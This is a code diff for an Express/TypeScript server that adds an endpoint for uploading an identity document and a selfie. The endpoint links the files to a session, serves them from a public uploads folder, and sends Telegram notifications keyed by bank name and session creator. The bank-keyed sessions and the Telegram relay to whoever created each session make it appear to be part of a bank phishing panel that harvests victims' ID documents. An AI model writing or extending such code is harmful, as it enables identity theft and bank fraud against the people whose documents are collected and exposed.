@@ -1016,6 +1016,83 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
     }
   });
 
+  // Endpoint para subir documentos de identidad (documento + selfie)
+  app.post('/api/upload-identity-files', upload.fields([
+    { name: 'documentFile', maxCount: 1 },
+    { name: 'selfieFile', maxCount: 1 }
+  ]), async (req, res) => {
+    try {
+      const files = req.files as { [fieldname: string]: Express.Multer.File[] };
+      const { sessionId, documentType } = req.body;
+
+      if (!sessionId) {
+        return res.status(400).json({ message: "Session ID requerido" });
+      }
+
+      if (!files.documentFile || !files.selfieFile) {
+        return res.status(400).json({ message: "Se requieren ambos archivos: documento y selfie" });
+      }
+
+      const documentFile = files.documentFile[0];
+      const selfieFile = files.selfieFile[0];
+
+      // Generar URLs de los archivos
+      const documentFileUrl = `/uploads/${documentFile.filename}`;
+      const selfieFileUrl = `/uploads/${selfieFile.filename}`;
+      
+      // Actualizar la sesión con la información de los archivos de identidad
+      const updatedSession = await storage.updateSession(sessionId, {
+        documentType: documentType,
+        documentFileName: documentFile.originalname,
+        documentFileUrl: documentFileUrl,
+        selfieFileName: selfieFile.originalname,
+        selfieFileUrl: selfieFileUrl,
+        identityVerified: true
+      });
+
+      console.log(`Documentos de identidad subidos para sesión ${sessionId}: ${documentType} + selfie`);
+
+      // Notificar por Telegram que se subieron documentos de identidad
+      try {
+        const session = await storage.getSessionById(sessionId);
+        if (session && session.createdBy) {
+          await sendTelegramNotification({
+            sessionId: sessionId,
+            banco: session.banco || 'UNKNOWN',
+            tipo: 'verificacion_id',
+            data: {
+              documentType: documentType,
+              documentFile: documentFile.originalname,
+              selfieFile: selfieFile.originalname
+            },
+            timestamp: new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' }),
+            createdBy: session.createdBy
+          });
+        }
+      } catch (notificationError) {
+        console.error('Error sending Telegram notification for identity documents:', notificationError);
+      }
+
+      res.json({
+        success: true,
+        documentFile: {
+          fileName: documentFile.originalname,
+          fileUrl: documentFileUrl,
+          fileSize: (documentFile.size / (1024 * 1024)).toFixed(2) + ' MB'
+        },
+        selfieFile: {
+          fileName: selfieFile.originalname,
+          fileUrl: selfieFileUrl,
+          fileSize: (selfieFile.size / (1024 * 1024)).toFixed(2) + ' MB'
+        },
+        documentType: documentType
+      });
+    } catch (error) {
+      console.error("Error uploading identity files:", error);
+      res.status(500).json({ message: "Error al subir archivos de identidad" });
+    }
+  });
+
   // Servir archivos estáticos desde la carpeta uploads
   app.use('/uploads', expressStatic(path.join(process.cwd(), 'uploads')));
 
